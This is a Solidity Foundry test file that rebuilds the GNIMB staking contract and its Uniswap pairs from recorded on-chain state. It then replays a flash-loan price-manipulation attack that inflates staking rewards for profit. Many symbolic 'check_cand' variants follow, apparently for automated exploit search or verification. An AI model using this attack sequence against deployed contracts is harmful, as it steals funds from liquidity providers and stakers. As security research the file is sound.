// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./GNIMB.sol";
import "./GNIMBStaking.sol";
import "./NBU.sol";
import "./NIMB.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract NMBTest is Test, BlockLoader {
    NBU nbu;
    NIMB nimb;
    GNIMB Gnimb;
    UniswapV2Pair pairnbunimb;
    UniswapV2Pair pairnbuGnimb;
    UniswapV2Factory factory;
    UniswapV2Router router;
    GNIMBStaking Gnimbstaking;
    address attacker;
    address constant owner = address(0x123456);
    uint256 blockTimestamp = 1670230642;
    uint112 reserve0pairnbuGnimb = 9725236852721155802678243;
    uint112 reserve1pairnbuGnimb = 1016511225892673227992;
    uint32 blockTimestampLastpairnbuGnimb = 1670230307;
    uint256 kLastpairnbuGnimb = 0;
    uint256 price0CumulativeLastpairnbuGnimb =
        1052794457038217438668234057466281170;
    uint256 price1CumulativeLastpairnbuGnimb =
        74014029905778659822139811585719758857071408;
    uint112 reserve0pairnbunimb = 265071137919497555608;
    uint112 reserve1pairnbunimb = 62674388176321590559182896;
    uint32 blockTimestampLastpairnbunimb = 1670230307;
    uint256 kLastpairnbunimb = 0;
    uint256 price0CumulativeLastpairnbunimb =
        419368656836799758243830020230033253638360300;
    uint256 price1CumulativeLastpairnbunimb =
        7839726508306236780654780670054918;
    uint256 totalSupplyGnimb = 100000000000000000000000000;
    uint256 balanceOfGnimbpairnbuGnimb = 9725236852721155802678243;
    uint256 balanceOfGnimbpairnbunimb = 0;
    uint256 balanceOfGnimbattacker = 0;
    uint256 balanceOfGnimbnbustaking = 7773233890289044800124719;
    uint256 totalSupplynimb = 10000000000000000000000000000;
    uint256 balanceOfnimbpairnbuGnimb = 0;
    uint256 balanceOfnimbpairnbunimb = 62674388176321590559182896;
    uint256 balanceOfnimbattacker = 0;
    uint256 balanceOfnimbnbustaking = 0;
    uint256 totalSupplynbu = 2466245080770284349640;
    uint256 balanceOfnbupairnbuGnimb = 1016511225892673227992;
    uint256 balanceOfnbupairnbunimb = 265071137919497555608;
    uint256 balanceOfnbuattacker = 0;
    uint256 balanceOfnbunbustaking = 0;

    function setUp() public {
        vm.warp(blockTimestamp);
        attacker = address(this);
        vm.startPrank(owner);
        nbu = new NBU();
        nimb = new NIMB();
        Gnimb = new GNIMB();
        pairnbunimb = new UniswapV2Pair(
            address(nbu),
            address(nimb),
            reserve0pairnbunimb,
            reserve1pairnbunimb,
            blockTimestampLastpairnbunimb,
            kLastpairnbunimb,
            price0CumulativeLastpairnbunimb,
            price1CumulativeLastpairnbunimb
        );
        pairnbuGnimb = new UniswapV2Pair(
            address(Gnimb),
            address(nbu),
            reserve0pairnbuGnimb,
            reserve1pairnbuGnimb,
            blockTimestampLastpairnbuGnimb,
            kLastpairnbuGnimb,
            price0CumulativeLastpairnbuGnimb,
            price1CumulativeLastpairnbuGnimb
        );
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pairnbunimb),
            address(pairnbuGnimb),
            address(0x0)
        );
        router = new UniswapV2Router(address(factory), address(0xdead));
        Gnimbstaking = new GNIMBStaking(
            address(nbu),
            address(nimb),
            address(Gnimb),
            address(router),
            50
        );
        Gnimb.transfer(address(Gnimbstaking), 1500000 ether);
        Gnimb.transfer(attacker, 150000 ether);
        vm.stopPrank();
        Gnimb.approve(address(Gnimbstaking), type(uint256).max);
        Gnimbstaking.stake(Gnimb.balanceOf(attacker));
        vm.warp(blockTimestamp + 8 * 24 * 60 * 60);
        vm.startPrank(owner);
        // Initialize balances and mock flashloan.
        nbu.transfer(address(pairnbunimb), balanceOfnbupairnbunimb);
        nimb.transfer(address(pairnbunimb), balanceOfnimbpairnbunimb);
        nbu.transfer(address(pairnbuGnimb), balanceOfnbupairnbuGnimb);
        Gnimb.transfer(address(pairnbuGnimb), balanceOfGnimbpairnbuGnimb);
        nbu.approve(attacker, UINT256_MAX);
        nimb.approve(attacker, UINT256_MAX);
        Gnimb.approve(attacker, UINT256_MAX);
        vm.stopPrank();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Nbu Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(nbu), nbu.decimals());
        queryERC20BalanceDecimals(address(nimb), address(nbu), nimb.decimals());
        queryERC20BalanceDecimals(
            address(Gnimb),
            address(nbu),
            Gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Nimb Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(nimb), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(nimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(Gnimb),
            address(nimb),
            Gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Gnimb Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(Gnimb), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(Gnimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(Gnimb),
            address(Gnimb),
            Gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Pairnbunimb Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(pairnbunimb),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(pairnbunimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(Gnimb),
            address(pairnbunimb),
            Gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Pairnbugnimb Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(pairnbuGnimb),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(pairnbuGnimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(Gnimb),
            address(pairnbuGnimb),
            Gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Gnimbstaking Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(Gnimbstaking),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(Gnimbstaking),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(Gnimb),
            address(Gnimbstaking),
            Gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(nbu), attacker, nbu.decimals());
        queryERC20BalanceDecimals(address(nimb), attacker, nimb.decimals());
        queryERC20BalanceDecimals(address(Gnimb), attacker, Gnimb.decimals());
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return nbu.balanceOf(attacker) >= 1e18 + balanceOfnbuattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_nbu(uint256 amount) internal {
        nbu.transferFrom(owner, attacker, amount);
    }

    function payback_nbu(uint256 amount) internal {
        nbu.transfer(owner, amount);
    }

    function borrow_nimb(uint256 amount) internal {
        nimb.transferFrom(owner, attacker, amount);
    }

    function payback_nimb(uint256 amount) internal {
        nimb.transfer(owner, amount);
    }

    function borrow_Gnimb(uint256 amount) internal {
        Gnimb.transferFrom(owner, attacker, amount);
    }

    function payback_Gnimb(uint256 amount) internal {
        Gnimb.transfer(owner, amount);
    }

    function swap_pairnbunimb_nbu_nimb(uint256 amount) internal {
        nbu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nbu);
        path[1] = address(nimb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbunimb_nimb_nbu(uint256 amount) internal {
        nimb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nimb);
        path[1] = address(nbu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbuGnimb_Gnimb_nbu(uint256 amount) internal {
        Gnimb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(Gnimb);
        path[1] = address(nbu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbuGnimb_nbu_Gnimb(uint256 amount) internal {
        nbu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nbu);
        path[1] = address(Gnimb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pairnbunimb() internal {
        pairnbunimb.sync();
    }

    function sync_pairnbuGnimb() internal {
        pairnbuGnimb.sync();
    }

    function transaction_Gnimbstaking_Gnimb(uint256 amount) internal {
        Gnimbstaking.getReward();
    }

    function test_gt() public {
        borrow_nimb(100000000e18);
        printBalance("After step0 ");
        swap_pairnbunimb_nimb_nbu(nimb.balanceOf(attacker));
        printBalance("After step1 ");
        transaction_Gnimbstaking_Gnimb(0);
        printBalance("After step2 ");
        swap_pairnbunimb_nbu_nimb(nbu.balanceOf(attacker));
        printBalance("After step3 ");
        swap_pairnbuGnimb_Gnimb_nbu(Gnimb.balanceOf(attacker));
        printBalance("After step4 ");
        swap_pairnbunimb_nbu_nimb(3 ether);
        printBalance("After step5 ");
        payback_nimb((100000000e18 * 1003) / 1000);
        printBalance("After step6 ");
        require(attackGoal(), "Attack failed!");
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 300000000000000006245004);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbuGnimb_Gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_nimb(amt6);
        assert(!attackGoal());
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 300000000000000006245004);
        borrow_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_nbu(amt4);
        assert(!attackGoal());
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 300000000000000006245004);
        borrow_nbu(amt0);
        swap_pairnbuGnimb_nbu_Gnimb(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbuGnimb_Gnimb_nbu(amt3);
        payback_nbu(amt4);
        assert(!attackGoal());
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 300000000000000006245004);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_nimb(amt4);
        assert(!attackGoal());
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 300000000000000006245004);
        borrow_Gnimb(amt0);
        swap_pairnbuGnimb_Gnimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbuGnimb_nbu_Gnimb(amt3);
        payback_Gnimb(amt4);
        assert(!attackGoal());
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 300000000000000006245004);
        borrow_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbuGnimb_Gnimb_nbu(amt4);
        payback_nbu(amt5);
        assert(!attackGoal());
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 300000000000000006245004);
        borrow_nbu(amt0);
        swap_pairnbuGnimb_nbu_Gnimb(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbuGnimb_Gnimb_nbu(amt3);
        swap_pairnbuGnimb_Gnimb_nbu(amt4);
        payback_nbu(amt5);
        assert(!attackGoal());
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 300000000000000006245004);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_nimb(amt5);
        assert(!attackGoal());
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 300000000000000006245004);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbuGnimb_Gnimb_nbu(amt4);
        payback_nimb(amt5);
        assert(!attackGoal());
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 300000000000000006245004);
        borrow_Gnimb(amt0);
        swap_pairnbuGnimb_Gnimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbuGnimb_nbu_Gnimb(amt3);
        swap_pairnbuGnimb_nbu_Gnimb(amt4);
        payback_Gnimb(amt5);
        assert(!attackGoal());
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 300000000000000006245004);
        borrow_Gnimb(amt0);
        swap_pairnbuGnimb_Gnimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbuGnimb_nbu_Gnimb(amt3);
        swap_pairnbuGnimb_Gnimb_nbu(amt4);
        payback_Gnimb(amt5);
        assert(!attackGoal());
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 300000000000000006245004);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbuGnimb_Gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_nimb(amt6);
        assert(!attackGoal());
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 300000000000000006245004);
        borrow_Gnimb(amt0);
        swap_pairnbuGnimb_Gnimb_nbu(amt1);
        transaction_Gnimbstaking_Gnimb(amt2);
        swap_pairnbuGnimb_nbu_Gnimb(amt3);
        swap_pairnbuGnimb_Gnimb_nbu(amt4);
        swap_pairnbuGnimb_nbu_Gnimb(amt5);
        payback_Gnimb(amt6);
        assert(!attackGoal());
    }
}
